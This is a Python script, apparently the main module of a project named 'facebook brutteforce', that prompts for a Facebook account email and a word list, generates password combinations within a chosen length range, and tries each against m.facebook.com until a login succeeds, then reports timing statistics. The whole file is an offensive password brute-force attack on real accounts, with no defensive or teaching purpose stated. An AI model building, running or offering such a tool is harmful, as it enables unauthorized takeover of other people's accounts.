'''
 Author: Gabriel Vieira Nunes
 Project: facebook brutteforce
'''

from domain.services.signin import SignIn
from domain.services.passgen import PassGen
import time

class Main():

    def __init__(self, **args):
        email = input("[+] Please Enter Email From Facebook :>> ")
        words = input("[+] Please Enter Here All Word for combination :>> ")
        minLength = (int)(input("[+] Please Enter Minimum Lenth Of Words  : >>  "))
        maxLength = (int)(input("[+] Please Enter Maximum Lenth Of Words  : >>  "))

        pg = PassGen(words, minLength, maxLength)
        counter = pg.CountWords()

        print("[+] Numbers Of Total Lines : ", counter)
        input('[+] Are You Ready ?[Press Enter]')
        print("\n\n+++++++++++++++++++++++++ Please Wait ++++++++++++++++++++++++++++++++++++++++\n \n")

        time1 = time.asctime()
        start = time.time()

        si = SignIn('http://m.facebook.com', 'Facebook')

        for password in pg.generateWord():
            credentials = si.connect(email, password)
            if not credentials:
                print(f'[-] FAIL, PASSWORD TRIED: {password}')
            else:
                print(f'[+] SUCESSFUL\n{credentials}')
                break

        print('\n\n+++++++++++++++++++++++++ Process Report +++++++++++++++++++++++++++++++++++++\n')
        print('\t [+] Process Started                      :   ', time1)
        end = time.time()
        print('\t [+] Process Completed                    :   ', time.asctime())
        totaltime = end - start
        print('\t [+] Total Time Consumed                  :   ', totaltime, 'second')
        rate = counter / totaltime
        print('\t [+] Rate Of Words Generating Per Seconds :   ', rate)

        print('\n+++++++++++++++++++++++++ Please Wait ++++++++++++++++++++++++++++++++++++++++')

        print('''
        \t***************************************************
        \t*           Successful thanks for using           * 
        \t***************************************************

        ''')

if __name__ == '__main__':
    m = Main()


